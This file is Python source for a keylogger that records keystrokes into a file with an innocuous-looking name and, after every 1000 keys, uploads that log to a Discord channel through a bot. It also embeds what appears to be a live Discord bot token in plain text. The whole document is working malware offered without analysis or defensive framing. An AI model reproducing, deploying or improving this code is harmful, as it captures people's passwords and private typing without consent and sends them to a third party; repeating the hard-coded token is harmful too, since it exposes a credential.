import discord
import asyncio
import msvcrt

TOKEN = 'MTIyOTcyNzIyOTM4MzI4Mjc0MQ.GPuo5j.eeiizozYP-0nDfmfj9BwQzWHBHabBp1tCI9MVQ'
logfile = 'c:/nodma.xyz'
channel_id = 1229728373803323424
intents = discord.Intents.default()
client = discord.Client(intents=intents)

keypress_count = 0


# Function to send file to Discord channel
async def send_file():
    channel = client.get_channel(channel_id)
    if channel:
        with open(logfile, 'rb') as file:
            await channel.send(file=discord.File(file))
        print("File sent successfully.")
    else:
        print("Channel not found.")


# Event handler for Discord client
@client.event
async def on_ready():
    print('We have logged in')
    await detect_key_press()


# Function to periodically check for key press
async def detect_key_press():
    global keypress_count
    while True:
        if msvcrt.kbhit():
            key = msvcrt.getch().decode('utf-8')
            with open(logfile, 'a') as f:
                f.write('{}\n'.format(key))
            print(key)
            keypress_count += 1
            if keypress_count == 1000:
                await send_file()
                keypress_count = 0  # Reset keypress count after sending the file
        await asyncio.sleep(0.1)  # Adjust the sleep duration as needed


# Start the bot
client.run(TOKEN)
